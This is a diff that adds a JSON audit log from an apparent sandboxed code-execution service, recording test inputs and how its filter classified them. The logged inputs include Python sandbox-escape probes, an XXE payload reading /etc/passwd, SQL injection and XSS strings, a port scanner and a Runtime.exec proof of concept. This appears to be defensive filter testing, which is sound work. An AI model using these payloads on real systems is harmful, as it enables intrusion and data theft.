@@ -1,0 +1,658 @@
+[
+  {
+    "timestamp": "2026-03-31T15:17:09.465019+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "print(\"Hello\")",
+    "classification": "SAFE",
+    "result": "None"
+  },
+  {
+    "timestamp": "2026-03-31T15:18:31.335329+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum(range(1, 101))",
+    "classification": "SAFE",
+    "result": "5050"
+  },
+  {
+    "timestamp": "2026-03-31T15:19:08.152580+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "admin",
+    "classification": "SAFE",
+    "result": "NameError: name 'admin' is not defined"
+  },
+  {
+    "timestamp": "2026-03-31T15:19:18.107295+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "/admin",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-03-31T15:19:24.839910+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "1+1",
+    "classification": "SAFE",
+    "result": "2"
+  },
+  {
+    "timestamp": "2026-03-31T15:21:07.395772+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum(range(1, 101))",
+    "classification": "SAFE",
+    "result": "5050"
+  },
+  {
+    "timestamp": "2026-03-31T15:21:58.121889+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:22:05.860383+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:22:06.398807+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "__builtins__",
+    "classification": "SUSPICIOUS",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:22:14.930182+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[x**2 for x in range(10)]",
+    "classification": "SAFE",
+    "result": "[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]"
+  },
+  {
+    "timestamp": "2026-03-31T15:35:50.657015+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os\nprint(\"Trying to access system\")",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:35:52.111079+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os\nprint(\"Trying to access system\")",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:35:52.881304+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os\nprint(\"Trying to access system\")",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:35:53.586141+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os\nprint(\"Trying to access system\")",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:39:32.510231+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "print(\"[ATTACK] Trying to access system files...\")\nimport os\nos.system(\"ls\")",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T15:51:54.706545+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([10, 20, 30])",
+    "classification": "SAFE",
+    "result": "60"
+  },
+  {
+    "timestamp": "2026-03-31T15:53:02.753446+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import subprocess",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T16:01:10.906604+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class WebSecurityTester {\n\n    public static void main(String[] args) {\n        String target = \"http://example.com\"; // change to your test site\n\n        System.out.println(\"Starting basic security checks on: \" + target);\n\n        checkSQLInjection(target);\n        checkXSS(target);\n    }\n\n    // Simulated SQL Injection Test\n    public static void checkSQLInjection(String baseUrl) {\n        try {\n            String payload = \"?id=1' OR '1'='1\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.toLowerCase().contains(\"sql\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible SQL Injection vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] SQL Injection test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] SQL test failed: \" + e.getMessage());\n        }\n    }\n\n    // Simulated XSS Test\n    public static void checkXSS(String baseUrl) {\n        try {\n            String payload = \"?q=<script>alert(1)</script>\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(\"<script>alert(1)</script>\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible XSS vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] XSS test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] XSS test failed: \" + e.getMessage());\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": null
+  },
+  {
+    "timestamp": "2026-03-31T16:13:56.531834+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "a = 500\nprint(a)\nimport sys\nb = a * 2",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import sys"
+  },
+  {
+    "timestamp": "2026-03-31T16:15:18.321095+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class WebSecurityTester {\n\n    public static void main(String[] args) {\n        String target = \"http://example.com\"; // change to your test site\n\n        System.out.println(\"Starting basic security checks on: \" + target);\n\n        checkSQLInjection(target);\n        checkXSS(target);\n    }\n\n    // Simulated SQL Injection Test\n    public static void checkSQLInjection(String baseUrl) {\n        try {\n            String payload = \"?id=1' OR '1'='1\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.toLowerCase().contains(\"sql\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible SQL Injection vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] SQL Injection test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] SQL test failed: \" + e.getMessage());\n        }\n    }\n\n    // Simulated XSS Test\n    public static void checkXSS(String baseUrl) {\n        try {\n            String payload = \"?q=<script>alert(1)</script>\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(\"<script>alert(1)</script>\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible XSS vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] XSS test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] XSS test failed: \" + e.getMessage());\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import java.io.BufferedReader;"
+  },
+  {
+    "timestamp": "2026-03-31T16:32:58.976320+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "\"or 1=1",
+    "classification": "SAFE",
+    "result": "SyntaxError: unterminated string literal (detected at line 1) (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-03-31T16:34:08.320204+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "' OR 1=1 --",
+    "classification": "SAFE",
+    "result": "SyntaxError: unterminated string literal (detected at line 1) (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-03-31T16:39:01.365779+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class WebSecurityTester {\n\n    public static void main(String[] args) {\n        String target = \"http://example.com\"; // change to your test site\n\n        System.out.println(\"Starting basic security checks on: \" + target);\n\n        checkSQLInjection(target);\n        checkXSS(target);\n    }\n\n    // Simulated SQL Injection Test\n    public static void checkSQLInjection(String baseUrl) {\n        try {\n            String payload = \"?id=1' OR '1'='1\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.toLowerCase().contains(\"sql\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible SQL Injection vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] SQL Injection test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] SQL test failed: \" + e.getMessage());\n        }\n    }\n\n    // Simulated XSS Test\n    public static void checkXSS(String baseUrl) {\n        try {\n            String payload = \"?q=<script>alert(1)</script>\";\n            URL url = new URL(baseUrl + payload);\n\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream()));\n\n            String line;\n            boolean vulnerable = false;\n\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(\"<script>alert(1)</script>\")) {\n                    vulnerable = true;\n                }\n            }\n\n            reader.close();\n\n            if (vulnerable) {\n                System.out.println(\"[WARNING] Possible XSS vulnerability detected!\");\n            } else {\n                System.out.println(\"[INFO] XSS test passed.\");\n            }\n\n        } catch (Exception e) {\n            System.out.println(\"[ERROR] XSS test failed: \" + e.getMessage());\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import java.io.BufferedReader;"
+  },
+  {
+    "timestamp": "2026-03-31T16:40:17.231747+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "x = 10\nimport os\ny = 20",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os"
+  },
+  {
+    "timestamp": "2026-03-31T16:46:19.978643+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "x = 10\nimport os\ny = 20",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os"
+  },
+  {
+    "timestamp": "2026-03-31T17:05:50.352215+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import socket\n\ntarget = input(\"Enter target IP: \")\nports = [21, 22, 23, 80, 443]\n\nfor port in ports:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    result = sock.connect_ex((target, port))\n    \n    if result == 0:\n        print(f\"Port {port} is OPEN\")\n    else:\n        print(f\"Port {port} is CLOSED\")\n    \n    sock.close()",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import socket"
+  },
+  {
+    "timestamp": "2026-03-31T17:09:46.401641+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import socket\n\ntarget = input(\"Enter target IP: \")\nports = [21, 22, 23, 80, 443]\n\nfor port in ports:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    result = sock.connect_ex((target, port))\n    \n    if result == 0:\n        print(f\"Port {port} is OPEN\")\n    else:\n        print(f\"Port {port} is CLOSED\")\n    \n    sock.close()",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import socket"
+  },
+  {
+    "timestamp": "2026-04-01T03:36:02.380079+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os"
+  },
+  {
+    "timestamp": "2026-04-01T03:40:00.694159+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os"
+  },
+  {
+    "timestamp": "2026-04-01T03:41:10.274669+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-04-01T03:41:37.064133+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "// A simple payload to launch a calculator (standard PoC for Windows)\n// or open a reverse shell on Linux.\npublic class Exploit {\n    static {\n        try {\n            // Executes a system command immediately upon class loading\n            Runtime.getRuntime().exec(\"calc.exe\"); \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: // or open a reverse shell on Linux."
+  },
+  {
+    "timestamp": "2026-04-01T03:41:49.427168+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "// A simple payload to launch a calculator (standard PoC for Windows)\n// or open a reverse shell on Linux.\npublic class Exploit {\n    static {\n        try {\n            // Executes a system command immediately upon class loading\n            Runtime.getRuntime().exec(\"calc.exe\"); \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: // or open a reverse shell on Linux."
+  },
+  {
+    "timestamp": "2026-04-01T03:42:18.223672+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "public class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-04-01T03:55:11.409427+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[].__class__.__subclasses__()",
+    "classification": "SUSPICIOUS",
+    "result": "Suspicious Line: [].__class__.__subclasses__()"
+  },
+  {
+    "timestamp": "2026-04-01T03:56:51.852395+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[].__class__.__subclasses__()",
+    "classification": "SUSPICIOUS",
+    "result": "Suspicious Line: [].__class__.__subclasses__()"
+  },
+  {
+    "timestamp": "2026-04-01T04:08:21.783162+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "ping 192.168.1.1",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<string>, line 1)"
+  },
+  {
+    "timestamp": "2026-04-01T05:00:13.796446+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__base__.__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__base__.__subclasses__()"
+  },
+  {
+    "timestamp": "2026-04-01T05:02:40.023530+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "public class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: System.out.println(\"Hello, World!\");"
+  },
+  {
+    "timestamp": "2026-04-01T05:27:30.266350+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([10, 20, 30])",
+    "classification": "SAFE",
+    "result": "60"
+  },
+  {
+    "timestamp": "2026-04-01T05:28:14.107490+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([10, 20, 30])dir()",
+    "classification": "SUSPICIOUS",
+    "result": "Suspicious Line: sum([10, 20, 30])dir()"
+  },
+  {
+    "timestamp": "2026-04-01T05:30:25.640425+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__base__.__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__base__.__subclasses__()"
+  },
+  {
+    "timestamp": "2026-04-01T08:57:19.808950+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "public class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: System.out.println(\"Hello, World!\");",
+    "previous_hash": null,
+    "current_hash": "75c2a6d7dfe62f16747f0a630480340e47a66e34116aa4fd793fdfac0a32892e"
+  },
+  {
+    "timestamp": "2026-04-01T09:02:34.385677+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "public class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "75c2a6d7dfe62f16747f0a630480340e47a66e34116aa4fd793fdfac0a32892e",
+    "current_hash": "0c9b7b059a449161dd581846bfac1700070342daf96cfe005bb0cf6485292733"
+  },
+  {
+    "timestamp": "2026-04-01T09:02:51.201002+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<stockCheck><productId>&xxe;</productId></stockCheck>",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "0c9b7b059a449161dd581846bfac1700070342daf96cfe005bb0cf6485292733",
+    "current_hash": "392d0d72c67bdaf7f2930740c1d3d269d332cb42fef6d70ad49d69d908ab16f7"
+  },
+  {
+    "timestamp": "2026-04-01T09:03:06.999818+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "// A simple payload to launch a calculator (standard PoC for Windows)\n// or open a reverse shell on Linux.\npublic class Exploit {\n    static {\n        try {\n            // Executes a system command immediately upon class loading\n            Runtime.getRuntime().exec(\"calc.exe\"); \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: Runtime.getRuntime().exec(\"calc.exe\");",
+    "previous_hash": "392d0d72c67bdaf7f2930740c1d3d269d332cb42fef6d70ad49d69d908ab16f7",
+    "current_hash": "bddb908ac4d8b352c536922bc7233fd1210583b152e76a4610cea0694e20a1f9"
+  },
+  {
+    "timestamp": "2026-04-01T09:07:44.011021+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[x**2 for x in range(10)]",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: ListComp",
+    "previous_hash": "bddb908ac4d8b352c536922bc7233fd1210583b152e76a4610cea0694e20a1f9",
+    "current_hash": "412e895f51904ec56f6f23d287c6312887aec088a80187f1d24d01553a194b96"
+  },
+  {
+    "timestamp": "2026-04-01T09:08:10.546564+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([1, 2, 3, 4])",
+    "classification": "SAFE",
+    "result": "10",
+    "previous_hash": "412e895f51904ec56f6f23d287c6312887aec088a80187f1d24d01553a194b96",
+    "current_hash": "9897610a10f750dd318d165f965a40f8eb90a88f399551ffaee3c0ea2f357e99"
+  },
+  {
+    "timestamp": "2026-04-01T09:08:22.929841+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([1, 2, 3, 4])[x**2 for x in range(10)]",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "9897610a10f750dd318d165f965a40f8eb90a88f399551ffaee3c0ea2f357e99",
+    "current_hash": "943ca10275a646850eb1cded09a456d479d86474d6834c125d1f415de7be5a95"
+  },
+  {
+    "timestamp": "2026-04-01T09:08:35.184006+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[x**2 for x in range(10)]",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: ListComp",
+    "previous_hash": "943ca10275a646850eb1cded09a456d479d86474d6834c125d1f415de7be5a95",
+    "current_hash": "4bc7807da93358f3f257ad5167cd413263c6b8da2d9c230978d59b137ea5a3c6"
+  },
+  {
+    "timestamp": "2026-04-01T09:12:03.598500+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "[x**2 for x in range(10)]",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: ListComp",
+    "previous_hash": "4bc7807da93358f3f257ad5167cd413263c6b8da2d9c230978d59b137ea5a3c6",
+    "current_hash": "f5d0e0349e232d8631defdfcc558657c4b1ebe9366b3e69ed389eb83271d3dc3"
+  },
+  {
+    "timestamp": "2026-04-01T10:50:09.842555+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "len([1, 2, 3, 4, 5])",
+    "classification": "SAFE",
+    "result": "5",
+    "previous_hash": "f5d0e0349e232d8631defdfcc558657c4b1ebe9366b3e69ed389eb83271d3dc3",
+    "current_hash": "3c5c5aa62e40c76ef0ad5668bc188b885a7bb0de9046037951e239283ca43f50"
+  },
+  {
+    "timestamp": "2026-04-01T10:51:05.982431+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "len([1, 2, 3, 4, 5])len([10, 20, 30])",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "3c5c5aa62e40c76ef0ad5668bc188b885a7bb0de9046037951e239283ca43f50",
+    "current_hash": "9858537c5bd308be7e3936d71463de0c4ed2e49eaffa2968764432f4768cf5c0"
+  },
+  {
+    "timestamp": "2026-04-01T10:51:45.081960+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "len([10, 20, 30])",
+    "classification": "SAFE",
+    "result": "3",
+    "previous_hash": "9858537c5bd308be7e3936d71463de0c4ed2e49eaffa2968764432f4768cf5c0",
+    "current_hash": "0e60791da3aab2782f6ecb1cb3078623a5ee43b8a923265577e2907c075a530a"
+  },
+  {
+    "timestamp": "2026-04-01T10:52:09.468332+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os",
+    "previous_hash": "0e60791da3aab2782f6ecb1cb3078623a5ee43b8a923265577e2907c075a530a",
+    "current_hash": "a4df6bccef5de4abf0d0f2987d52c6448d464386fd9dbc5f9c9595a205dd1695"
+  },
+  {
+    "timestamp": "2026-04-01T10:52:43.236655+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "dir()",
+    "classification": "SUSPICIOUS",
+    "result": "Suspicious Line: dir()",
+    "previous_hash": "a4df6bccef5de4abf0d0f2987d52c6448d464386fd9dbc5f9c9595a205dd1695",
+    "current_hash": "4bf4b4e5b8dcf1f6e1e92381ab4a9fb5501315e769d4b929b456ee7e81d546cf"
+  },
+  {
+    "timestamp": "2026-04-01T10:53:51.650806+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: __subclasses__()",
+    "previous_hash": "4bf4b4e5b8dcf1f6e1e92381ab4a9fb5501315e769d4b929b456ee7e81d546cf",
+    "current_hash": "2066df25339e696aded34a8fd91ce4bf18a035216314087df4d7738dbc35dc2b"
+  },
+  {
+    "timestamp": "2026-04-01T10:57:19.846507+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "__subclasses__()len([1,2,3,4,5])",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: __subclasses__()len([1,2,3,4,5])",
+    "previous_hash": "2066df25339e696aded34a8fd91ce4bf18a035216314087df4d7738dbc35dc2b",
+    "current_hash": "2cdebe9833cbb8bfec8edc84b8bed318b1d4ebc6b7ec194f8caf04ffe1475f47"
+  },
+  {
+    "timestamp": "2026-04-01T10:57:53.160102+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "len([1,2,3,4,5])",
+    "classification": "SAFE",
+    "result": "5",
+    "previous_hash": "2cdebe9833cbb8bfec8edc84b8bed318b1d4ebc6b7ec194f8caf04ffe1475f47",
+    "current_hash": "c17bb44b8e94282db55e00280b3ea3b1370549154f8cfec6bc5c7151a4b8b5cf"
+  },
+  {
+    "timestamp": "2026-04-02T08:32:29.825561+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([15, 25, 35]) * 2",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: Mult",
+    "previous_hash": "c17bb44b8e94282db55e00280b3ea3b1370549154f8cfec6bc5c7151a4b8b5cf",
+    "current_hash": "aace47b7fb597032cd2128a96efc7f225dde77ff47b0b25ae4792d73cbf29786"
+  },
+  {
+    "timestamp": "2026-04-02T08:32:32.240421+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "aace47b7fb597032cd2128a96efc7f225dde77ff47b0b25ae4792d73cbf29786",
+    "current_hash": "85203da9ecaa4c686e8913feca56f23b1f11722b962584f6820bf86e962a2811"
+  },
+  {
+    "timestamp": "2026-04-02T08:39:20.436698+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([15, 25, 35]) * 2",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: Mult",
+    "previous_hash": "85203da9ecaa4c686e8913feca56f23b1f11722b962584f6820bf86e962a2811",
+    "current_hash": "2295228124f7e1c08f03141d7d00e7f1478c9ac32b74d03057649b975467f501"
+  },
+  {
+    "timestamp": "2026-04-02T08:39:22.924500+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "2295228124f7e1c08f03141d7d00e7f1478c9ac32b74d03057649b975467f501",
+    "current_hash": "b6197b9d099edb24e2e1fc327e3c934dcb683b2bf0564d9390c4fb76af7a7d0b"
+  },
+  {
+    "timestamp": "2026-04-02T09:07:25.421080+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([15, 25, 35]) * 2",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: Mult",
+    "previous_hash": "b6197b9d099edb24e2e1fc327e3c934dcb683b2bf0564d9390c4fb76af7a7d0b",
+    "current_hash": "17a77d9beef506b689f79bf6a317116f9b2da5a16dbb10f9fae9051f0dfad5c0"
+  },
+  {
+    "timestamp": "2026-04-02T09:07:28.327327+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "17a77d9beef506b689f79bf6a317116f9b2da5a16dbb10f9fae9051f0dfad5c0",
+    "current_hash": "58d9792029154e8aceae64f88e707d2a48ae6e68359867272c16ccd055f40c58"
+  },
+  {
+    "timestamp": "2026-04-02T09:16:49.531196+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "sum([15, 25, 35]) * 2",
+    "classification": "SAFE",
+    "result": "AST_VALIDATION_FAILED: Prohibited operation: Mult",
+    "previous_hash": "58d9792029154e8aceae64f88e707d2a48ae6e68359867272c16ccd055f40c58",
+    "current_hash": "303214c004db9866371cd5f4afbe2462eeff2bd8db2399acec7610fbf27efb99"
+  },
+  {
+    "timestamp": "2026-04-02T09:16:52.090685+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "303214c004db9866371cd5f4afbe2462eeff2bd8db2399acec7610fbf27efb99",
+    "current_hash": "e69499dfab3571f6656056fd52dfed3b9665dc5fb288944aa825ab879eff5cae"
+  },
+  {
+    "timestamp": "2026-04-02T10:35:17.806579+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__base__",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__base__",
+    "previous_hash": "e69499dfab3571f6656056fd52dfed3b9665dc5fb288944aa825ab879eff5cae",
+    "current_hash": "76f30624e57ab8e4e43796bc60986158fd1942cc1c7abde37c0678e4064d54a5"
+  },
+  {
+    "timestamp": "2026-04-02T10:35:20.597642+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "76f30624e57ab8e4e43796bc60986158fd1942cc1c7abde37c0678e4064d54a5",
+    "current_hash": "d62aad074de485e1feae8c73cc43927ee1a82074e9a7eaa2c7fb6d680d588a11"
+  },
+  {
+    "timestamp": "2026-04-02T10:39:13.940489+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os",
+    "previous_hash": "d62aad074de485e1feae8c73cc43927ee1a82074e9a7eaa2c7fb6d680d588a11",
+    "current_hash": "875f6ece2675845e1755b4347080987d4fb5bc75f1322ee68fab1f810aec89e1"
+  },
+  {
+    "timestamp": "2026-04-02T10:39:16.515911+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
